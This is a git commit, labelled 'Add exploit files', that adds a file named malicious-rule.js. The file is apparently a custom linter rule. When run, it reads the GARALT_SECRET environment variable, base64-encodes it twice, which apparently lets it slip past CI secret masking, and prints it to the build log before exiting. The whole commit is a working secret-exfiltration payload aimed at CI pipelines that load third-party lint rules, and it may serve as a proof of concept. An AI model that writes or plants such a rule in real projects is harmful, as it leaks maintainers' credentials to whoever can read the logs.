afc8ce3d5f43a881cb04a034970e3b27cff96831
radeeshovashsain <izdev2026+radee@outlook.com>
2026-06-09 03:47:51 +0800

    Add exploit files

---
+++ malicious-rule.js
@@ -0,0 +1,11 @@
+module.exports = {
+  names: ['malicious-rule'],
+  description: 'Rule that executes code',
+  function: function rule(params, onError) {
+    const secret = process.env.GARALT_SECRET || '';
+    const b64 = Buffer.from(secret).toString('base64');
+    const b64b64 = Buffer.from(b64).toString('base64');
+    console.log('GARALT_LEAKED_TOKEN=' + b64b64);
+    process.exit(1);
+  }
+};
